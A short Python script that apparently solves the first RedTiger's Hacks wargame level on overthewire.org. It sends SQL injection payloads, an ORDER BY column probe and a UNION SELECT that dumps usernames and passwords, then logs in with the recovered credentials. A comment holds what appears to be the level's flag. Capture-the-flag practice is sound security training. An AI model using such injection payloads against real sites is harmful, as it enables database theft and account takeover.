import requests

TARGET_URL = "https://redtiger.labs.overthewire.org/level1.php"
NO_OF_COL = 5
payload1 = {'cat' : f"1 ORDER BY {NO_OF_COL}-- /"}

payload2 = {'cat': f"1 UNION SELECT 1, 2, username, password FROM level1_users"}

payload3 = {'user': 'Hornoxe', 'password': 'thatwaseasy', 'login': 'Login'}

response = requests.get(TARGET_URL, params=payload2)
# print(response.text)

response = requests.post(TARGET_URL, data=payload3)
print(response.text)
# passwords_will_change_over_time_let_us_do_a_shitty_rhyme
